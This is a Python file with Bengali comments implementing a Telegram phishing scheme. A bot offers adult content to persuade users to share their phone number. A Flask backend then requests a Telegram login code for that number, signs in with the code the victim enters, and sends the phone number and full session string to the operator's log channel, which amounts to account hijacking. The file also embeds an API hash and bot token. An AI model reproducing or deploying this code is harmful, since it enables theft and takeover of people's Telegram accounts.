import os
import asyncio
import threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, types
from telethon.sessions import StringSession # সেশন স্ট্রিং জেনারেট করার জন্য

# --- কনফিগারেশন ---
API_ID = 34278231
API_HASH = '49cf7ab41e479d21a93c150a77c0cf85'
BOT_TOKEN = '7626824489:AAFByXbvcTLUvoavK-CMBKOw9DNf3GpNgQE'
LOG_CHANNEL_ID = -1003822887929  # এখানে আপনার চ্যানেলের আইডি বসান

app = Flask(__name__)
CORS(app)

# টেলিগ্রাম ক্লায়েন্ট সেটআপ
client = TelegramClient('bot_session', API_ID, API_HASH)

# সেশন ডাটা সেভ করার জন্য গ্লোবাল ডিকশনারি
user_sessions = {}

# ১. বটের মাধ্যমে নম্বর সংগ্রহ
@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    markup = event.client.build_reply_markup(
        types.KeyboardButtonRequestPhone("Access Now 🔞")
    )
    await event.respond("অ্যাডাল্ট কন্টেন্ট দেখতে আগে নম্বর শেয়ার করুন:", buttons=markup)

@client.on(events.NewMessage)
async def handle_contact(event):
    if event.message.contact:
        await event.respond("ধন্যবাদ! এখন বাম পাশের 'Open' বাটনে ক্লিক করে ভেরিফিকেশন শেষ করুন।")

# ২. নম্বর গ্রহণ করে ওটিপি পাঠানোর API
@app.route('/login', methods=['POST'])
async def login():
    data = request.json
    phone = data.get('phone')
    
    # ইউজার প্রতি আলাদা StringSession তৈরি (এটিই আপনার কুকি/সেশন হিসেবে কাজ করবে)
    user_client = TelegramClient(StringSession(), API_ID, API_HASH)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code_request(phone)
        user_sessions[phone] = {
            'client': user_client,
            'hash': sent_code.phone_code_hash
        }
        return jsonify({"status": "success", "message": "OTP Sent!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ৩. ওটিপি ভেরিফাই করে লগ চ্যানেলে ডাটা পাঠানো
@app.route('/verify', methods=['POST'])
async def verify():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    
    session_data = user_sessions.get(phone)
    if not session_data:
        return jsonify({"status": "error", "message": "Session not found. Restart login."}), 400
    
    user_client = session_data['client']
    phone_code_hash = session_data['hash']
    
    try:
        # ওটিপি দিয়ে লগইন করা
        await user_client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
        
        # সেশন স্ট্রিং জেনারেট করা
        session_string = user_client.session.save()
        
        # আপনার লগ চ্যানেলে ডাটা পাঠানো
        log_text = (
            f"✅ **New Account Logged In**\n\n"
            f"📱 **Phone:** `{phone}`\n"
            f"🔑 **Session String:** `{session_string}`"
        )
        await client.send_message(LOG_CHANNEL_ID, log_text)
        
        return jsonify({"status": "success", "message": "Login Successful! Data sent to log channel."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ৪. সার্ভার এবং বট একসাথে চালানো
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    client.start(bot_token=BOT_TOKEN)
    client.run_until_disconnected()